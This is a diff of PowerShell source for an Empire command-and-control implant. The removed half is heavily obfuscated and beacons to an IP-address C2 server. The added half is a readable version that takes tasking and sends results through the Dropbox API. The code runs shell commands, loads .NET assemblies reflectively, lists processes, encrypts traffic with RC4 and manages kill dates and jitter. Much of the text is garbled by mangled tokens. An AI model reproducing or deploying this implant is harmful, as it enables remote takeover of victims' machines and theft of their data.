-&(6hdI6hd+6hdnvo6hd+6hdke-b6hd+6hdoyo6hd) -Servers @((6hdhttp://1396hd+6hd.1806hd+6hd.6hd+6hd171.6hd+6hd1106hd+6hd:221616hd)) -StagingKey (6hdfe6hd+6hd12adf6hd+6hd6627392f416hd+6hdca297fc56hd+6hd3eca6hd+6hde266hd) -SessionKey ((6hdM6hd+6hdt6hd+6hdQn6hd+6hd1XA~6hd+6hdB{1}82.KO6hd+6hd9v6hd+6hd!h6hd+6hdu^:{0})6hd+6hdy+6hd+6hd,r6hd+6hdH6hd+6hdpc[6hd)  -F  [CHAr]96,[CHAr]124) -SessionID (6hdLJ20WR6hd+6hdX6hd+6hdT6hd) -WorkingHours 6hd6hd -KillDate 6hd6hd;','Inheritability]::ELNiNhCjMERITACjMBCjMLEELN);
-                        0dU{pipCjMECjMCCjMLIEnCjMTSTRCjMeAm} = [System.IO.Pipes.AnonymousPipeClientStream]::ELNNCjMeWELN([System.IO.Pipes.PipeDirection]::ELNOCjMUtELN, 0dU{pipeserVCjMECjMRCjMSCjMTrEaM}.ELNCLientCjMSCjMAfEpCjMICjMpEHaNCjMdLEELN);
-                        0dU{sCjMTCjMREAmrEaDeR} = [System.IO.StreamReader]::(6hdn6hd+6hdew6hd).Invoke(0dU{pCjMICjMpECjMSErCjMVeCjMRstreaM});
-                        0dU{DiCjMCt} = @{(6hda6hd+6hdssem6hd+6hdbly6hd) = 0dU{ASCjMsCjMEM}; (6hdpara6hd+6hdms6hd) = 0dU{PACjMRaMS}; (6hdpi6hd+6hdpe6hd) = 0dU{PICjMpeCLIENCjMTsTCjMReaM}};
-                        0dU{pCjMs} = [PowerShell]::(6hdCre6hd+6hdate6hd).Invoke();
-                        0dU{TACjMsk} = 0dU{PCjMS}.ELNAdDCjMscRICjMPTELN(6hd
-                        [CmdletBinding()]
-                        param(
-                            [System.Reflection.Assembly]
-                            0dUassembly,
-                            [String[]]
-                            0dUparams,
-                            [IO.Pipes.AnonymousPipeClientStream]
-                            0dUPipe
-                        )
-                        try {
-                            0dUstreamProp = 0dUassembly.GetType(ELNTaskELN).GetProperty(ELNOutputStreamELN);
-                            0dUstreamProp.SetValue(0dUnull, 0dUpipe, 0dUnull);
-                            0dUassembly.GetType(ELNTaskELN).GetM','U{RCjMEMaCjMINiNG} = 0dU{deCCjMOCjMDED}[6];
-        0dU{reSCjMUlCjMTpaCKeCjMTs} = 0dU(&(6hdPr6hd+6hdo6hd+6hdc6hd+6hdess-Taskin6hd+6hdg6hd) 0dU{tCjMypE} 0dU{DACjMTA} 0dU{TCjMASCjMKID});
-        0dU{oCjMFFsEt} = 12 + 0dU{lECjMNgTH};
-        while(0dU{RECjMMaCjMinCjMIng}.ELNlEN','TER}.(6hdTo6hd+6hdStr6hd+6hding6hd).Invoke();
-                    }
-            }
-            0dU{oCjMUCjMTPut} += ELNCjMnCjMrELN;
-        }
-        elseif (0dU{CCjMmD}.(6hdT6hd+6hdoL6hd+6hdower6hd).Invoke() -eq (6hdreflec6hd+6hdtivel6hd+6hdoad6hd)){
-            if (0dU{CMDCjMArgs}.ELNLCjMENCjMgthELN -eq 6hd6hd) { 0dU{oUTCjMpCjMUT} = (6hdn6hd+6hdo binary s6hd+6hdu6hd+6hdpplie6hd+6hdd6hd) };
-            &(6hde6hd+6hdlse6hd){
-                0dU{asseMCjMBly} = [System.Reflection.Assembly]::ELNlCjMOadELN([Convert]::(6hdFromBa6hd+6hdse64St6hd+6hdring6hd).Invoke(0dU{cmDACjMRGS}));
-                0dU{oUTpCjMUT} = (ELNCjMnCjMr ELN+6hdRefle6hd+6hdct6hd+6hdive 6hd+6hdLoad6hd+6hd 6hd+6hdCo6hd+6hdm6hd+6hdplete6hd);
-            }
-        }
-        else {
-            switch -regex (0dU{CCjMmd}) {
-                ((6hd(ls{0}^6hd+6hdd6hd+6hdi6hd+6hdr6hd+6hd)6hd)-F  [cHAR]124) {
-                    if (0dU{CMDCjMArCjMgS}.ELNLEngCjMTHELN -eq ELNELN) {
-                        0dU{OCjMUTCjMPut} = &(6hdGet-Chi6hd+6hdldI6hd+6hdtem6hd) -force hmz &(6hdsel6hd+6hdec6hd+6hdt6hd) (6hdmod6hd+6hde6hd),@{(6hdNa6hd+6hdme6hd)=(6hdO6hd+6hdwner6hd);(6hdEx6hd+6hdpress6hd+6hdion6hd)={(&(6hdG6hd+6hdet-Acl6hd) 0dU{_}.ELNfullCjMNaCjMMeELN).ELNOCjMwnERELN }},@{(6hdN6hd+6hdame6hd)=(6hdL6hd+6hda6hd+6hdstW6hd+6hdriteTime6hd);(6hdExpr6hd+6hde6hd+6hdssio6hd+6hdn6hd)={(0dU{_}.ELNlACjMsCjMTwCjMRITEtImEELN.(6hdToStr6hd+6hdi6hd+6hdng6hd).Invoke(ELNuELN))}},(6hdlen6hd+6hdgth6hd),(6hdnam6hd+6hde6hd) hmz &(6hdCo6hd+6hdnvertTo6hd+6hd-Js6hd+6hdon6hd);
-                    }
-                    else {
-                        try{
-                            0dU{oCjMUCjMTpuT} = &(6hdI6hd+6hdEX6hd) (ELN0dUcmd ELN+ELN0dUcmdargs ELN+6hd-Fo6hd+6hdrce 6hd+6hd-Err6hd+6hdorAct6hd+6hdion 6hd+6hdS6hd+6hdtop6hd) hmz &(6hdse6hd+6hdlec6hd+6hdt6hd) (6hdmod6hd+6hde6hd),@{(6hdNa6hd+6hdme6hd)=(6hdOwn6hd+6hder6hd);(6hdExp6hd+6hdres6hd+6hds6hd+6hdion6hd)={ (&(6hdGet6hd+6hd-Acl6hd) 0dU{_}.ELNfulCjMlNaCjMMeELN).ELNoCjMWneRELN }},@{(6hdNa6hd+6hdme6hd)=(6hdLa6hd+6hds6hd+6hdtWrit6hd+6hdeTime6hd);(6hdExpres6hd+6hds6hd+6hdion6hd)={(0dU{_}.ELNlastCjMwCjMRItetIMEELN.(6hdToStrin6hd+6hdg6hd).Invoke(ELNuELN))}},(6hdl6hd+6hdength6hd),(6hdn6hd+6hdame6hd) hmz &(6hdC6hd+6hdonve6hd+6hdrtTo-Json6hd);
-                        }
-                        catch [System.Management.Automation.ActionPreferenceStopException] {
-                   ','U{SCCjMRCjMipT:CjMWOrKiNGHOurs}.(6hdsp6hd+6hdlit6hd).Invoke(ELN-ELN)[0]);
-            0dU{eCjMND} = &(6hdGet-6hd+6hdDat6hd+6hde6hd) (0dU{SCjMcCjMRiCjMpT:WOrkCjMiNGCjMhoUCjMRs}.(6hds6hd+6hdplit6hd).Invoke(ELN-ELN)[1]);
-            if ((0dU{ECjMNd}-0dU{sCjMTACjMRT}).ELNhoUCjMRSELN -lt 0) {
-                0dU{STaCjMRt} = 0dU{STACjMRt}.(6hdAd6hd+6hddDa6hd+6hdys6hd).Invoke(-1);
-            }
-            0dU{SCjMTCjMACjMRTCheCk} = 0dU{cCjMUrrCjMEnt} -ge 0dU{STaCjMRT};
-            0dU{ECjMNCjMdcHeCk} = 0dU','6hdc6hd+6hdt6hd) (6hdwin36hd+6hd26hd+6hd_proc6hd+6hdess6hd) hmz &(6hdF6hd+6hdor6hd+6hdEach-Object6hd) {
-                        try {
-                            0dU{o} = 0dU{_}.(6hdget6hd+6hdowner6hd).Invoke()
-                            if (-not 0dU(0dU{o}.ELNUCjMSERELN)) {
-                                0dU{o} = (6hdN6hd+6hd/A6hd)
-                            } else {
-                                0dU{O} = ELN0dU(0dUo.Domain)F070dU(0dUo.User)ELN
-                            }
-                        } catch {
-                            0dU{O} = (6hdN/6hd+6hdA6hd)
-                        }
-                        0dU{owCjMNErs}[0dU{_}.ELNHAndCjMlEELN] = 0dU{o}
-                    }
-                    if(0dU{CCjMmCjMDarGs} -ne 6hd6hd) { 0dU{p} = 0dU{CCjMmD','     0dU{ROUtCjMIngpCjMAcCjMkCjMet} = 0dU{pCjMACKECjMTdata}[(0dU{oFFCjMSet}+0)..(0dU{OFfsCjMet}+19)];
-                0dU{roCjMUCjMTinGIv} = 0dU{RouTCjMinCjMgPaCKeT}[0..3];
-                0dU{rOUtCjMInGECjMNCdaCjMTA} = 0dU{rCjMOUtiCjMNgpaCCjMkCjMeT}[4..19];
-                0dU{OFFCjMsET} += 20;
-                0dU{SCjMkb} = 0dU{enCjMCCjMoDinG}.(6hdGetBy','sCjMem} = [Reflection.Assembly]::(6hdlo6hd+6hdad6hd).Invoke(0dU{aSsemCjMBCjMyTES','ethod(ELNExecuteELN).Invoke(0dUnull,0dUparams);
-                            }
-                        finally {
-                            0dUpipe.Dispose();
-                            }
-6hd).(6hdA6hd+6hdddParam6hd+6hdeters6hd).Invoke(0dU{DCjMICt}).(6hdBe6hd+6hdginI6hd+6hdnvoke6hd).Invoke();
-                        0dU{PipCjMeoUtCjMpCjMUt} = [Text.StringBuilder]::(6hdne6hd+6hdw6hd).Invoke();
-                        0dU{buffCjMer} = [char[]]::(6hdn6hd+6hdew6hd).Invoke(0dU{piPCjMeCjMsECjMRVERCjMstREaM}.ELNiCjMNBUFCjMFERCjMsiZeELN);
-                        while (0dU{rCjMEad} = 0dU{sCjMTreaMReaCjMdER}.(6hdRe6hd+6hdad6hd).Invoke(0dU{bCjMUCjMFFeR}, 0, 0dU{BUfCjMFer}.ELNleCjMNGthELN)) {
-                            [void]0dU{pCjMIpECjMOutPCjMUT}.(6hdAppe6hd+6hdnd6hd).Invoke(0dU{BCjMUCjMFfeR}, 0, 0dU{rCjMEAD});
-                        }
-                        0dU{ps}.(6hdEndI6hd+6hdn6hd+6hdvoke6hd).Invoke(0dU{TCjMASK});
-                        0dU{rCjMEsCjMULTS} = 0dU{pCjMIpEOCjMUtCjMput}.(6hdToStr6hd+6hding6hd).Invoke();
-                    }
-                    &(6hdEnc6hd+6hdod6hd+6hde-Pack6hd+6hdet6hd) -data 0dU{reCjMSUlCjMTs} -type 40 -ResultID 0dU{rECjMsCjMULTid};
-                }
-                catch {
-                    &(6hdEn6hd+6hdc6hd+6hdode6hd+6hd-Packet6hd) -type 0 -data (6hd[!] 6hd+6hdE6hd+6hdrror6hd+6hd w6hd+6hdhi6hd+6hdle6hd+6hd execut6hd+6hding a6hd+6hdssembly6hd) -ResultID 0dU{ReSULCjMTID};
-                }
-            }
-            elseif(0dU{TCjMyPE} -eq 50) {
-                0dU{dowNLCjMoACjMDs} = 0dU{SCRIpt:CjMJCjMoCjMBS}.ELNkECjMysELN -join ELNCjMnELN;
-                &(6hdEnco6hd+6hdde-P6hd+6hda6hd+6hdck6hd+6hdet6hd) -data ((6hdR6hd+6hdunnin6hd+6hdg 6hd+ELNJobs:CjMn0dUDownloadsELN)) -type 0dU{TyCjMpE} -ResultID 0dU{reCjMSuLTid};
-            }
-            elseif(0dU{tyCjMpe} -eq 51) {
-                0dU{jCjMoCjMBname} = 0dU{DCjMATA};
-                0dU{JCjMobreCjMsultId} = 0dU{ResCjMUCjMlTIDS}[0dU{JOBCjMNaCjMME}];
-                try {
-                    0dU{RCjMeSuCjMltS} = &(6hdStop-A6hd+6hdge6hd+6hdntJob6hd) -JobName 0dU{jCjMOBnAME} hmz &(6hdfl6hd) hmz &(6hdO6hd+6hdut-S6hd+6hdt6hd+6hdring6hd);
-                    if(0dU{rCjMEsULCjMTs} -and 0dU(0dU{ReSCjMULCjMTs}.(6hdtri6hd+6hdm6hd).Invoke() -ne 6hd6hd)) {
-                        &(6hdEn6hd+6hdcode-P6hd+6hdack6hd+6hdet6hd) -type 0dU{TCjMYPE} -data 0dU(0dU{rCjMeSULCjMTs}) -ResultID 0dU{jOCjMBReSUlCjMTID};
-                    }
-                    &(6hdEncode6hd+6hd-Pac6hd+6hdk6hd+6hdet6hd) -type 51 -data (6hdJ6hd+6hdob 6hd+ELN0dUJobName ELN+6hdkille6hd+6hdd.6hd) -ResultID 0dU{JOCjMBrCjMesUCjMlTId};
-                }
-                catch {
-                    &(6hdEn6hd+6hdcode6hd+6hd-Packet6hd) -type 0 -data (6hd[!]6hd+6hd 6hd+6hdE6hd+6hdr6hd+6hdror 6hd+6hdi6hd+6hdn 6hd+6hdst6hd+6hdop6hd+6hdping 6hd+6hdjo6hd+6hdb: 6hd+ELN0dUJobNameELN) -ResultID 0dU{jObReSCjMULtCjMID};
-                }
-            }
-            elseif(0dU{TYCjMpe} -eq 60) {
-                &(6hdEnco6hd+6hdde6hd+6hd-Packet6hd) -type 0 -data (6hd[6hd+6hd!] SOCK6hd+6hdS server not6hd+6hd i6hd+6hdmpleme6hd+6hdnted6hd) -ResultID 0dU{RCjMeSUlC','0dU{SCjMcCjMRICjMPT:sCjMERVeR} = (6hdhttp://136hd+6hd9.6hd+6hd16hd+6hd86hd+6hd0.6hd+6hd171.16hd+6hd106hd+6hd:221616hd);
-0dU{scRICjMpCjMT:CjMCOCjMNtROlSERCjMVERs} = @(0dU{ScRiCjMptCjM:sCjMeRvER});
-0dU{scRiPT:SCjMERveCjMRInCjMDex} = 0;
-if(0dU{sECjMRVEr}.(6hdS6hd+6hdtartsWit6hd+6hdh6hd).Invoke((6hdh6hd+6hdttps6hd))){
-    [System.Net.ServicePointManager]::ELNSErVCjMERcErCjMTIFiCCjMAtEvCjMAlidATionCjMCCjMAllBaCjMcKELN = {0dU{TCjMRue}};
-}
-
-0dU{ScripCjMT:SENCjMDCjMMesSAge} = {
-    param(0dU{paCjMckECjMTs})
-
-    if(0dU{PaCjMCCjMKETs}) {
-
-        0dU{eCjMNCjMcBYTCjMES} = &(6hdEncr6hd+6hdypt-6hd+6hdB6hd+6hdytes6hd) 0dU{pAcKeCjMTs};
-
-
-
-        0dU{rCjMoutinGpaCjMckeT} = &(6hdN6hd+6hde6hd+6hdw6hd+6hd-RoutingPacket6hd) -EncData 0dU{EnCjMcCjMBYTEs} -Meta 5;
-
-        if(0dU{sCripTCjM:CCjMoNCjMTrolsECjMRVerS}[0dU{scrCjMiPt:SeRvCjMECjMRCjMIndex}].(6hdSta6hd+6hdrtsWit6hd+6hdh6hd).Invoke((6hdht6hd+6hdtp6hd))) {
-
-            0dU{WCjMc} = &(6hdNew-O6hd+6hdb6hd+6hdjec6hd+6hdt6hd) (6hdSy6hd+6hdst6hd+6hdem.Ne6hd+6hdt.6hd+6hdWebCl6hd+6hdient6hd);
-
-            0dU{WCjMC}.ELNPrCjMOxYELN = [System.Net.WebRequest]::(6hdGetSyst6hd+6hdemWebP6hd+6hdr6hd+6hdoxy6hd).Invoke();
-            0dU{wc}.ELNpROCjMxYELN.ELNCReDECjMNtCjMiCjMALsELN = [System.Net.CredentialCache]::ELNdCjMEFCjMAUlCjMTCRCjMEdENTialsELN;
-            if(0dU{scCjMRCjMIpT:pCjMRoxY}) {
-                0dU{Wc}.ELNpCjMROxYELN = 0dU{scRCjMipTCjM:CjMpRoxY};
-            }
-
-            0dU{wC}.ELNHCjMEACjMDErSELN.(6hdAd6hd+6hdd6hd).Invoke((6hdUser6hd+6hd-6hd+6hdAgent6hd), 0dU{SCRiPT:CjMUCjMsCjMERaGEnT});
-            0dU{SCjMCripTCjM:HCjMEadCjMErs}.(6hdG6hd+6hdetE6hd+6hdnum6hd+6hderato6hd+6hdr6hd).Invoke() hmz &(6hdF6hd+6hdorEac6hd+6hdh-Obj6hd+6hde6hd+6hdct6hd) {0dU{WCjMC}.ELNHeCjMAderSELN.(6hdAd6hd+6hdd6hd).Invoke(0dU{_}.ELNnCjMAMEELN, 0dU{_}.ELNVALCjMUeELN)};
-
-            try {
-
-                0dU{TCjMAskCjMUrI} = 0dU{ScrCjMICjMPtCjM:tAsCjMKuris} hmz &(6hdGe6hd+6hdt-R6hd+6hda6hd+6hdndom6hd);
-                0dU{rECjMSPCjMOCjMNSe} = 0dU{wC}.ELNUPLCjMOaCjMDdaTaELN(0dU{sCRIPt:contrCjMolSeCjMRvECjMRs}[0dU{sCrCjMipT:seRVErCjMiCjMNDEX}]+0dU{TASCjMkUCjMRI}, (6hdP6hd+6hdOST6hd), 0dU{rOCjMUtCjMingpACjMCKCjMET});
-            }
-            catch [System.Net.WebException]{
-
-                if (0dU{_}.ELNExCjMCepTCjMIoNELN.(6hdG6hd+6hdetBa6hd+6hdseExcept6hd+6hdi6hd+6hdon6hd).Invoke().ELNrespOnCjMsEELN.ELNSTACjMTuSCoCjMdeELN -eq 401) {
-
-                    &(6hdStar6hd+6hdt6hd+6hd-6hd+6hdNegotia6hd+6hdte6hd) -S ELN0dUScript:serverELN -SK 0dU{sCjMK} -UA 0dU{UCjMA};
-                    }
-                }
+        catch {
+            if ($_ -match 'Unable to connect') {
+                $Script:MissedCheckins += 1;
             }
         }
     };
 
-0dU{sCRCjMIPT:GEttCjMACjMSK} = {
-    try {
-        if (0dU{sCriPCjMT:CCjMOnCjMTrolSeCjMRVCjMERs}[0dU{sCRCjMiPCjMTCjM:SerCjMVeCjMRiNDCjMEX}].(6hdS6hd+6hdtartsW6hd+6hdit6hd+6hdh6hd).Invoke((6hdh6hd+6hdttp6hd))) {
+$Script:SendMessage = {
+    param($Packets)
+
+    if ($Packets)
+    {
+
+        $EncBytes = Encrypt-Bytes $Packets;
 
 
-            0dU{ROCjMUTICjMNgpaCCjMKEt} = &(6hdNe6hd+6hdw-RoutingP6hd+6hdac6hd+6hdket6hd) -EncData 0dU{NUCjMlL} -Meta 4;
-            0dU{ROUTINgCCjMOOKCjMiE} = [Convert]::ELNTCjMOCjMBASCjME64sCjMTriNgELN(0dU{RCjMOutInCjMGPCjMACjMckeT});
+
+        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
 
 
-            0dU{wCjMC} = &(6hdNew-Ob6hd+6hdj6hd+6hdect6hd) (6hdSy6hd+6hdst6hd+6hdem.6hd+6hdNet.WebCl6hd+6hdien6hd+6hdt6hd);
+        $wc = New-Object System.Net.WebClient;
+
+        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+        if ($Script:Proxy)
+        {
+            $wc.Proxy = $Script:Proxy;
+        }
+
+        $wc.Headers.Add('User-Agent', $Script:UserAgent);
+        $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
+
+        $ResultsFolder = '/filmes/pontuacao';
+
+        try
+        {
 
 
-            0dU{WC}.ELNpCjMRoxyELN = [System.Net.WebRequest]::(6hdGetSy6hd+6hdste6hd+6hdmW6hd+6hde6hd+6hdbPr6hd+6hdoxy6hd).Invoke();
-            0dU{WCjMC}.ELNpRCjMoXyELN.ELNCREdECjMNtIaCjMlSELN = [System.Net.CredentialCache]::ELNdEfaUCjMLTcRCjMedentICjMAlSELN;
-            if(0dU{sCCjMRipCjMTCjM:prOCjMxy}) {
-                0dU{wCjMC}.ELNPCjMRoXYELN = 0dU{SCRiPCjMT:PCjMRCjMOxy};
+            try
+            {
+                $Data = $Null;
+                $wc.Headers.Set("Authorization", "Bearer $( $Script:APIToken )");
+                $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$( $Script:SessionID ).txt`"}");
+                $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
+            }
+            catch
+            {
             }
 
-            0dU{WCjMc}.ELNHEadCjMERSELN.(6hdAd6hd+6hdd6hd).Invoke((6hdUser-6hd+6hdAg6hd+6hdent6hd),0dU{sCjMCCjMRCjMIPT:uCjMSeRaCjMGEnT});
-            0dU{sCjMcCjMRICjMpt:HECjMADERs}.(6hdG6hd+6hdet6hd+6hdEnu6hd+6hdmerator6hd).Invoke() hmz &(6hd%6hd) {0dU{Wc}.ELNHeaDCjMECjMRSELN.(6hdA6hd+6hddd6hd).Invoke(0dU{_}.ELNnCjMAMEELN, 0dU{_}.ELNvCjMAluEELN)};
-            0dU{WCjMc}.ELNHeaDCjMeRSELN.(6hdA6hd+6hddd6hd).Invoke((6hdC6hd+6hdookie6hd),ELNsession=0dURoutingCookieELN);
+            if ($Data -and $Data.Length -ne 0)
+            {
+                $RoutingPacket = $Data + $RoutingPacket;
+            }
 
+            $wc2 = New-Object System.Net.WebClient;
+            $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if ($Script:Proxy)
+            {
+                $wc2.Proxy = $Script:Proxy;
+            }
 
-            0dU{taSCjMKuCjMRI} = 0dU{SCRIpt:CjMTASCjMkuRCjMIS} hmz &(6hdGet-R6hd+6hda6hd+6hdndom6hd);
-            0dU{reCjMSCjMUlt} = 0dU{wCjMC}.ELNdCjMOWNlOACjMddCjMATAELN(0dU{SCjMcrIpCjMT:CONTRCjMOCjMlSCjMeRCjMVERs}[0dU{SCjMcCjMRCjMIpCjMT:serVERINCjMdeX}] + 0dU{TCjMASKuCjMRi});
-            0dU{RCjMesuLT};
+            $wc2.Headers.Add("Authorization", "Bearer $( $Script:APIToken )");
+            $wc2.Headers.Add("Content-Type", "application/octet-stream");
+            $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($Script:SessionID).txt`"}");
+            $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket);
+            $Script:MissedCheckins = 0;
+        }
+        catch
+        {
+            if ($_ -match 'Unable to connect')
+            {
+                $Script:MissedCheckins += 1;
+            }
         }
     }
-    catch [Net.WebException] {
-        0dU{scRIPCjMTCjM:mICjMsSeDcHCjMECjMcCjMkiNs} += 1;
-        if (0dU{_}.ELNEXCjMCePCjMTIOnELN.(6hdGetBas6hd+6hdeExc6hd+6hdept6hd+6hdio6hd+6hdn6hd).Invoke().ELNrECjMSpoCjMNsEELN.ELNstCjMACjMTUSCodEELN -eq ','hd+6hdl6hd+6hda/6hd+6hd56hd+6hd.0 (Wi6hd+6hdn6hd+6hdd6hd+6hdo6hd+6hdw6hd+6hds NT 6hd+6hd106hd+6hd.6hd+6hd0; 6hd+6hdWin6hd+6hd66hd+6hd4; x64) Apple6hd+6hdWebKi6hd+6hdt6hd+6hd/56hd+6hd37.36 (KHTML6hd+6hd,6hd+6hd 6hd+6hdlike 6hd+6hdGecko6hd+6hd)6hd+6hd Chr6hd+6hdo6hd+6hdme/6hd+6hd115.6hd+6hd0.6hd+6hd06hd+6hd.6hd+6hd0 6hd+6hdSafari/56hd+6hd37.366hd) -f[chAR]124),
-        [Int32]
-        0dU{lOCjMSTLCjMImit} = 60,
+};
+function Invoke-Empire {
+    param(
+        [Parameter(Mandatory=$true)]
         [String]
-        0dU{deCjMFAuLCjMTrespCjMoNCjMsE} = (6hdPCFET0NUWVBFIGh06hd+6hdbWwgUFVCTElDICItLy9XM0M6hd+6hdvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly96hd+6hdFTiIgImh0dHA6Ly93d3cudzM6hd+6hdub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR6hd+6hd0cDovL3d3dy53My5vcmcvMTk5OS94aHRt6hd+6hdbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU6hd+6hd5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG56hd+6hdvdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlI6hd+6hdHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO26hd+6hdZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsL6hd+6hdCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllb6hd+6hdGRzZXR7cGFkZGluZzowI6hd+6hdDE6hd+6hd1cHggMTBweCAxNXB4O30gCmgxe2Zv6hd+6hdbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2Nv6hd+6hdbG9yOiNDQzAwMDA76hd+6hdfSAKaDN7Zm9u','      0dU{sCjMTR} += ((6hdNV56hd+6hdpowe6hd+6hdrshe6hd+6hdllNV56hd).ELNrEPlCjMAceELN(([ChaR]78+[ChaR]86+[ChaR]53),6hdhmz6hd)) + 0dU{pCjMsvErSiCjMOnCjMTable}.ELNPCjMsversICjMOnELN.ELNMaCjMjoRELN;
-        0dU{sCjMTr} += ELNhmzELN + 0dU{EnCjMV:PRocESsOr_ARCjMCHCjMiTECTCjMUrE};
-        0dU{sCjMTR};
+        $StagingKey,
+        [Parameter(Mandatory=$true)]
+        [String]
+        $SessionKey,
+        [Parameter(Mandatory=$true)]
+        [String]
+        $SessionID,
+        [Int32]
+        $AgentDelay = 52,
+        [Double]
+        $AgentJitter = 0.0,
+        [String[]]
+        $Servers,
+        [String]
+        $KillDate,
+        [Int32]
+        $KillDays,
+        [String]
+        $WorkingHours,
+        [object]
+        $ProxySettings,
+        [String]
+        $Profile = "/tarantino/pulpfiction,/scorcese/killersofflowers,/copola/godfather|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+        [Int32]
+        $LostLimit = 12,
+        [String]
+        $DefaultResponse = ""
+    )
+    $Encoding = [System.Text.Encoding]::ASCII;
+    $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
+    $script:AgentDelay = $AgentDelay;
+    $script:AgentJitter = $AgentJitter;
+    $script:LostLimit = $LostLimit;
+    $script:MissedCheckins = 0;
+    $script:ResultIDs = @{};
+    $script:WorkingHours = $WorkingHours;
+    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse));
+    $script:Proxy = $ProxySettings;
+    $script:CurrentListenerName = "";
+    $Script:ServerIndex = 0;
+    $Script:ControlServers = $Servers;
+    $Retries = 1;
+    if($KillDays) {
+        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
     }
-    function iNVokE-CjMsheLlCjMCCjMOMMAnd {
-        param(0dU{cCjMmd}, 0dU{cCjMMCjMDARGs}=ELNELN)
-        if (0dU{cmDCjMArGS} -like ELN*CjMELNF07F07*ELN) {
-            0dU{CmCjMDaCjMRGS} = 0dU{cMdCjMACjMRGS} -replace ELNCjMELNF07F07ELN,ELNFileSystem::CjMELNF07ELN;
+    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
+        $script:KillDate = $KillDate
+    }
+    $ProfileParts = $Profile.split('|');
+    $script:TaskURIs = $ProfileParts[0].split(',');
+    $script:UserAgent = $ProfileParts[1];
+    $script:SessionID = $SessionID;
+    $script:Headers = @{};
+    if($ProfileParts[2]) {
+        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
+            $Parts = $_.Split(':');
+            $script:Headers.Add($Parts[0],$Parts[1]);
         }
-        elseif (0dU{CCjMmdARGS} -like ((6hd*6hd+6hduFMuF6hd+6hdM*6hd).ELNrECjMPLAceELN(6hduFM6hd,[STRING][cHar]92))) {
-            0dU{CMdaRCjMGS} = 0dU{CMdCjMARCjMgs} -replace ((6hdsFmsFmsF6hd+6hdm6hd+6hdsFm6hd).ELNRepCjMLACjMceELN(([Char]115+[Char]70+[Char]109),[StRinG][Char]92)),((6hdFileSys6hd+6hdtem::fX6hd+6hdvf6hd+6hdXv6hd)  -creplaCE([cHaR]102+[cHaR]88+[cHaR]118),[cHaR]92);
+    }
+    $Script:Jobs = @{};
+    $Script:Downloads = @{};
+    $script:ImportedScript = '';
+    function ConvertTo-Rc4ByteStream {
+        Param ($In, $RCK)
+        begin {
+            [Byte[]] $S = 0..255;
+            $J = 0;
+            0..255 | ForEach-Object {
+                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $S[$_], $S[$J] = $S[$J], $S[$_];
+            };
+            $I = $J = 0;
         }
-        0dU{ouTCjMpCjMUt} = 6hd6hd;
-        if (0dU{cCjMMd}.(6hdT6hd+6hdoL6hd+6hdower6hd).Invoke() -eq (6hdshel6hd+6hdl6hd)) {
-            if (0dU{CmdCjMArCjMGs}.ELNLCjMENGCjMThELN -eq 6hd6hd) { 0dU{oUCjMTPCjMUT} = (6hdn6hd+6hdo shell 6hd+6hdco6hd+6hdmman6hd+6hdd6hd+6hd supplied6hd) }
+        process {
+            ForEach($Byte in $In) {
+                $I = ($I + 1) % 256;
+                $J = ($J + $S[$I]) % 256;
+                $S[$I], $S[$J] = $S[$J], $S[$I];
+                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
+            }
+        }
+    }
+    function Get-HexString {
+        param([byte]$Data)
+        ($Data | ForEach-Object { "{0:X2}" -f $_ }) -join ' ';
+    }
+    function Set-Delay {
+        param([int]$d, [double]$j=0.0)
+        $script:AgentDelay = $d;
+        $script:AgentJitter = $j;
+        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter";
+    }
+    function Get-Delay {
+        "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter";
+    }
+    function Set-LostLimit {
+        param([int]$l)
+        $script:LostLimit = $l;
+        if($l -eq 0)
+        {
+            "agent set to never die based on checkin Limit";
+        }
+        else
+        {
+            "agent LostLimit set to $script:LostLimit";
+        }
+    }
+    function Get-LostLimit {
+        "agent LostLimit: $script:LostLimit";
+    }
+    function Set-Killdate {
+        param([string]$date)
+        $script:KillDate = $date;
+        "agent killdate set to $script:KillDate";
+    }
+    function Get-Killdate {
+        "agent killdate: $script:KillDate";
+    }
+    function Set-WorkingHours {
+        param([string]$hours)
+        $script:WorkingHours = $hours;
+        "agent working hours set to $($script:WorkingHours)";
+    }
